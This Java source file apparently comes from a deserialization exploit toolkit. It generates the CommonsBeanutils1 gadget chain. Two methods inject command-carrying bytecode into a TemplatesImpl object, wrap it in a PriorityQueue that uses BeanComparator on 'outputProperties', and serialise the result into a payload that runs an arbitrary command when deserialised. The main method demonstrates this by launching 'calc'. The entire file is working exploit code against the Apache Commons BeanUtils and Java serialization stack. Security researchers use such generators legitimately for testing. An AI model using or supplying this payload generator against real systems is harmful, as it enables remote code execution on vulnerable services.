package com.gulvn;


import org.apache.commons.beanutils.BeanComparator;
import org.apache.xalan.xsltc.trax.TemplatesImpl;
import org.apache.xalan.xsltc.trax.TransformerFactoryImpl;
import sun.security.util.ByteArrayLexOrder;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.nio.charset.StandardCharsets;
import java.util.PriorityQueue;

import static com.bytecode.HelloTemplatesImpl.genByteCode;
import static com.util.Reflections.setFieldValue;

public class CommonsBeanutils1 {

    public byte[] genpayload(String cmd) throws Exception{
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][] {genByteCode(cmd)});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        BeanComparator comparator = new BeanComparator();
        PriorityQueue queue = new PriorityQueue(2,comparator);
        queue.add(1);
        queue.add(1);
        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{obj, obj});//其实这个就是add ，compare就是这两个compare
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();
        return  barr.toByteArray();
    }
    public byte[] genpayloadNoComparableComparator(String cmd) throws Exception{
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][] {genByteCode(cmd)});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
//        java.util.Collections$ReverseComparator
        PriorityQueue queue = new PriorityQueue(2,comparator);
        queue.add("1".getBytes(StandardCharsets.UTF_8));
        queue.add("1".getBytes(StandardCharsets.UTF_8));
        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{obj, obj});//其实这个就是add ，compare就是这两个compare
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();
        return  barr.toByteArray();
    }

    public static void main(String[] args)  throws  Exception{
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(new CommonsBeanutils1().genpayload("calc")));
        ois.readObject();
    }
}
